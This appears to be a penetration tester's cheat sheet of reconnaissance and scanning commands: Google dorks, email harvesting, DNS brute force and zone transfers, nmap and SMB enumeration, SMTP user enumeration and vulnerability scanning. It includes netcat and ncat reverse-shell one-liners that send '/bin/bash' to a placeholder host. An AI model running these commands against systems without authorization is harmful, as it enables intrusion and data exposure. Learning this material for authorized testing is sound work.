################################################################################
updatedb -> locate -> which
sort -u (uniq)
uniq -c # count instances
grep -v #invert matches inVert
nmap -oN/oX/oS/oG #output in Normal, Xml, Script kiddie, or Grepable format
################################################################################
nc -nlvp 1337 #listen on port - reverse shell?
nc -nlvp 1337 >filename.exe #listen for a file
nc -nv 1.3.3.7 1337 < ~/filename.exe #send a file
nc -nv 1.3.3.7 1337 -e /bin/bash #send a command prompt / reverse shell
nc -nlvp 1337 -e /bin/bash #listen with a command prompt
################################################################################
ncat --exec /bin/bash --allow 1.3.3.7 -vnl 1337 --ssl # listen with shell, ssl
ncat -v 1.3.3.7 1337 --ssl # connect to shell
################################################################################
tcpdump -n #dont lookup ip address to dns
tcpdump -n src host 1.3.3.7
tcpdump -n dest host 1.3.3.7
tcpdump -nX #view packet data in shell
tcpdump -n -r filename.pcap #use a saved session file to read from
################################################################################
:::::::::   :::::::::   ::::::::::  :::         :::::::::::  ::::    ::::  
:+:    :+:  :+:    :+:  :+:         :+:             :+:      +:+:+: :+:+:+ 
+:+    +:+  +:+    +:+  +:+         +:+             +:+      +:+ +:+:+ +:+ 
+#++:++#+   +#++:++#:   +#++:++#    +#+             +#+      +#+  +:+  +#+ 
+#+         +#+    +#+  +#+         +#+             +#+      +#+       +#+ 
#+#         #+#    #+#  #+#         #+#             #+#      #+#       #+# 
###         ###    ###  ##########  ##########  ###########  ###       ### 
################################################################################
Google
site:domain.com #results from that domain
site:domain.com -site:www.domain.com #get subdomains that are not www.domain.com
intitle:"test title" #in the title of the html
filetype:pdf #file extension
inurl:(service | authors | administrators | users) #any of these in the url
- #switch off, i.e. -filetype:txt for NOT filetype txt
https://www.exploit-db.com/google-hacking-database #fun searches
################################################################################
theharvester -d domain.com -b google >google.txt #search google for email accts
theharvester -d domain.com -b bing -l 500 >bing.txt #search bing, max 500
################################################################################
:::::::::   ::::    :::   ::::::::  
:+:    :+:  :+:+:   :+:  :+:    :+: 
+:+    +:+  :+:+:+  +:+  +:+        
+#+    +:+  +#+ +:+ +#+  +#++:++#++ 
+#+    +#+  +#+  +#+#+#         +#+ 
#+#    #+#  #+#   #+#+#  #+#    #+# 
#########   ###    ####   ########  
################################################################################
whois domain.com
whois 1.3.3.7 #reverse lookup
################################################################################
recon-ng
use recon/contacts/gather/http/api/whois_pocs # search for employee names/email
show options
set DOMAIN domain.com
run 
use recon/hosts/enum/http/web/xssed # search for vulnerable xss
set DOMAIN domain.com
run
use recon/hosts/gather/http/web/google_site #search for subdomains via google
set DOMAIN domain.com
run
use recon/hosts/gather/http/web/ip_neighbor #search for associated ip addr/dns
set SOURCE domain.com
run
################################################################################
host -t ns domain.com #get name servers
host -t mx domain.com #get mail servers
host www.domain.com #get ip addr for subdomain www
#put entries like "www\nftp\nmail\nowa\proxy\nrouter" in a text file
#then to find if the domain is up and get its ip address pointed to:
for ip in $(cat my_list.txt); do host ${ip}.domain.com; done
# ^ forward lookup brute force
# reverse lookup brute force:
for ip in $(seq 7 254); do host 1.3.3.${ip}; done | grep -v "not found"
host -l domain.com ns1.domain.com #attempt a zone transfer
#^ this will give a full dump of the zone file if it works, every ip and dns
################################################################################
dnsrecon -d domain.com -t axfr #dns enumeration
dnsenum domain.com Edns enumeration
################################################################################
 ::::::::    ::::::::       :::      ::::    ::: 
:+:    :+:  :+:    :+:    :+: :+:    :+:+:   :+: 
+:+         +:+          +:+   +:+   :+:+:+  +:+ 
+#++:++#++  +#+         +#++:++#++:  +#+ +:+ +#+ 
       +#+  +#+         +#+     +#+  +#+  +#+#+# 
#+#    #+#  #+#    #+#  #+#     #+#  #+#   #+#+# 
 ########    ########   ###     ###  ###    #### 
################################################################################
nc -nvv -w 1 -z 1.3.3.7 1337-31337 #simple connect scan (tcp) NOISY
nv -nv -u -z -w 1 1.3.3.7 53-1337 #simple connect scan (udp) -reply if not open
nmap -sT 1.3.3.7 #default tcp scan, defaults to 1000 popular ports
nmap -sT -p 1-65535 1.3.3.7 #full port tcp scan, ~4.5MB of traffic scan
nmap -sn 1.3.3.7-254 -oG ping-sweet.txt #ping sweep
grep Up ping-sweep.txt | cut -d " " -f 2 #get hosts that responded to ping
nmap -p 80 1.3.3.7-254 -oG web-sweep.txt #sweep for port 80
grep open web-sweep.txt | cut -d " " -f 2 #get hosts that have open port 80
nmap -sT -A --top-ports=20 1.3.3.7-254 -oG top-port-sweep.txt #sweep top 20 port
# -A = OS detection, version detection, script scanning and traceroute
nmap -O 1.3.3.7 #OS fingerprinting
nmap -sV -sT 1.3.3.7 #banner grabbing/service enumeration - also try -A
################################################################################
smb
################################################################################
nmap 1.3.3.7 --script smb-os-discovery.nse #discover SMB info, OS/netBIOS
nmap --script=dns-zone-transfer -p 53 ns2.domain.com #attempt zone transfer
nmap -v -p 139.445 -oG smb.txt 1.3.3.7-254 #sweep for SMB
nbtscan -r 192.168.11.0/24 #NBT name scan
enum4linux -a 1.3.3.7 #enumerate SMB/NetBIOS info from host
ls /usr/share/nmap/scripts/smb* #smb scripts for nmap scan
nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 1.3.3.7
################################################################################
smtp
################################################################################
nc -nv 1.3.3.7 25
VRFY root
VRFY idontexist
^C
################################################################################
vulnerability
################################################################################
ls /usr/share/nmap/scripts/*vuln*
nmap -v -p 80 --script=http-vuln-cve2010-2861 1.3.3.7
nmap -v -p 21 --script=ft-anon.nse 1.3.3.7-254 #anonymous ftp access?
nmap -v -p 139,445 --script=smb-security-mode 1.3.3.7 #smb security info
searchsploit slmail #find vulnerabilites for slmail
################################################################################
openvas-setup #enter a strong password for admin
openvas-adduser
root
pass
<password>
gsd #launch Greenebone Security Desktop, login with root:password
configure a target
start a new task, run the scan
################################################################################
